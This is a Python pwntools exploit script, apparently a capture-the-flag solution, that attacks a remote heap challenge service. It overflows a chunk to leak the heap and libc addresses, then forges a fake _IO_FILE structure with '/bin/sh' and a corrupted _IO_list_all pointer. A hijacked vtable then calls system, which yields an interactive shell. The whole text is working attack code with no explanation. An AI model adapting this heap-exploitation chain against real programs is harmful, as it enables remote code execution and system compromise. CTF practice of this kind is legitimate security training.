from pwn import *

def create(size):
    r.sendlineafter('choice:','1')
    r.sendlineafter('Size:',str(size))

def delete(idx):
    r.sendlineafter('choice:','2')
    r.sendlineafter('Index:',str(idx))

def edit(idx,size,cont):
    r.sendlineafter('choice:','3')
    r.sendlineafter('Index:',str(idx))
    r.sendlineafter('Size:',str(size))
    r.sendafter('Data:',cont)

def show(idx):
    r.sendlineafter('choice:','4')
    r.sendlineafter('Index:',str(idx))
    Name = r.recvline().strip()[5:]
    Content = r.recvline().strip()[8:]
    return Name,Content


###Useful Address
IO_list_all_offset = 0x3c4520
main_arena_offset = 0x3c3b20
system_offset = 0x45390

###Start Exploit
r = remote('csie.ctf.tw',10146)

###Create block*2
r.sendafter('Name:','a'*0x20)
create(0x80)
create(0x80)
create(0x80)
delete(1)
edit(0,0x90,b'a'*0x90)
name,content = show(0)
heap = u64(name[0x20:].ljust(8,b'\x00'))-0x10
libc_base = u64(content[0x90:].ljust(8,b'\x00'))-main_arena_offset-0x58
print(hex(heap))
print(hex(libc_base))
io_list_all = libc_base + IO_list_all_offset
fd = 0
bk = io_list_all-0x10
edit(0,0x200,b'a'*0x80+b'/bin/sh\x00'+p64(0x61)+p64(fd)+p64(bk)+p64(0)+p64(1))
vtable = heap+0x170
system = libc_base+system_offset
edit(2,0x100,b'\x00'*0x38+p64(vtable)+b'b'*0x18+p64(system))
create(0x80)
r.interactive()
